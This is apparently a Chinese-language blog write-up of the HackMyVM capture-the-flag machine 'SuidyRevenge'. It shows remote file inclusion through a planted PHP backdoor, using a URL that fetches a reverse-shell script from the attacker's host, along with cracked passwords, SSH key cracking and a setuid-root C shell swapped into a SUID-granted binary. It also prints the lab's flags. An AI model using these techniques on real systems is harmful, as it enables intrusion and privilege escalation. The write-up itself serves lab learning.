---
title: MazeSec SuidyRevenge
date: 2025-04-01 17:33:00
categories: 
  - MazeSec
tags:
  - 
---

# SuidyRevenge

项目地址：https://downloads.hackmyvm.eu/suidyrevenge.zip

是一个打包好的镜像文件

**注意：导入 ova 时一定要选择我已移动，否则没网**

使用 Nmap 扫描出开放服务及操作系统版本

![](https://pic1.imgdb.cn/item/6a1fa196b69adaba3f8b1bfd.png)

## RCE

### simple-backdoor

访问页面

![](https://pic1.imgdb.cn/item/6a1fa1b1b69adaba3f8b1c06.png)

查看源码有注释提示

```
"mudra" 才不是什么最好的管理员，我还在里面！！！ 他只是把我的密码改了，但我来得及从我的 KALI 系统里放了 2 个 PHP 后门 到 /supersecure 目录下，来保持访问权限！ —— theuser
```

![](https://pic1.imgdb.cn/item/6a1fa1fbb69adaba3f8b1c5a.png)

根据提示从 Kali 中找自带的 PHP WebShell

![](https://pic1.imgdb.cn/item/6a1fa379b69adaba3f8b1f3e.png)

最后一个可以访问

![](https://pic1.imgdb.cn/item/6a1fa3a7b69adaba3f8b1f97.png)

查看源码找到了使用方法

![](https://pic1.imgdb.cn/item/6a1fa45db69adaba3f8b2034.png)

## 远程文件包含

### mysuperbackdoor

查看文件发现了另一个后门

![](https://pic1.imgdb.cn/item/6a1fa413b69adaba3f8b202b.png)

访问过去回显 `file parameter is my friend.`

前面的 `cmd parameter is my friend.` 表示 `cmd` 的参数，那这个就说明参数是 `file`

![](https://pic1.imgdb.cn/item/6a1fa49cb69adaba3f8b203b.png)

`file` 本身就具有文件的意思，应该是要传入文件名

![](https://pic1.imgdb.cn/item/6a1fa4f9b69adaba3f8b2044.png)

果然和预想的一样

![](https://pic1.imgdb.cn/item/6a1fa4f9b69adaba3f8b2044.png)

接下来测试远程文件包含

```
?file=http://192.168.125.4:8989/reverp.php
```

![](https://pic1.imgdb.cn/item/6a1fa7029ecef7401783a870.png)

成功 RCE

![](https://pic1.imgdb.cn/item/6a1fa7129ecef7401783a875.png)

## 提权

### Python 升级为交互式 Shell

![](https://pic1.imgdb.cn/item/6a1fa75c9ecef7401783a88f.png)

### 敏感信息泄露

在提升 Shell 交互式后，在 `html/` 目录下找到提示信息

![](https://pic1.imgdb.cn/item/6a1fc28b9ecef740178441bc.png)

爆破得到密码 `iloveyou`

![](https://pic1.imgdb.cn/item/6a1fc3679ecef74017846739.png)

查看 `home` 目录发现还有这么多用户

![](https://pic1.imgdb.cn/item/6a1fc8739ecef740178468b9.png)

根据前面的网页注释有提到 `theuser`

```
Im proud to announce that "theuser" is not anymore in our servers. Our admin "mudra" is the best admin of the world. -suidy
<!--
 
"mudra" is not the best admin, IM IN!!!!
He only changed my password to a different but I had time
to put 2 backdoors (.php) from my KALI into /supersecure to keep the access!
 
-theuser
 
-->
```

密码就是 `different`（又玩脑洞），登录成功

![](https://pic1.imgdb.cn/item/6a1fc8df9ecef740178468d6.png)

要找到 violent 用户的私钥

![](https://pic1.imgdb.cn/item/6a1fc3ba9ecef74017846752.png)

`find` 查找 `id_rsa`

![](https://pic1.imgdb.cn/item/6a1fc4829ecef7401784678f.png)

登录还是需要输入密码

![](https://pic1.imgdb.cn/item/6a1fc4b69ecef74017846795.png)

`john` 爆破出密码为 `ihateu`

![](https://pic1.imgdb.cn/item/6a1fc5899ecef740178467e6.png)

登录成功

![](https://pic1.imgdb.cn/item/6a1fc5be9ecef740178467f0.png)

### SUID 提权

查找具有 SUID 权限的文件（theuser 用户需要看上面弱口令部分）

![](https://pic1.imgdb.cn/item/6a1fc97c9ecef74017846967.png)

直接运行提权成功

![](https://pic1.imgdb.cn/item/6a1fca1e9ecef7401784699c.png)

### 环境变量劫持

查看提示

```
root runs the script as in the past that always gives SUID to suidyyyyy binary

译：root 用户像过去一样运行着那个脚本，它总是会给 suidyyyyy 这个二进制文件赋予 SUID 权限
```

![](https://pic1.imgdb.cn/item/6a1fcb719ecef74017846a5e.png)

所以我们可以创建一个恶意的 `suidyyyyy` 文件，等待提示中的脚本给我们权限，然后再运行

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main (void)
{
    setgid(0);
    setuid(0);
    system("/bin/bash");
    return 0;   
}
```

![](https://pic1.imgdb.cn/item/6a1fcd1a9ecef74017846be4.png)

删除原文件，把我们的恶意文件拷贝过去等待赋权

最后看其他大佬的 WP 说是有大小检查，所以这里死活提不上去

```bash
rm /home/suidy/suidyyyyy && cp /tmp/suidyyyyy /home/suidy/suidyyyyy
```

![](https://pic1.imgdb.cn/item/6a1fcda49ecef74017846c3c.png)

```
HMVbisoususeryay
HMVvoilarootlala
```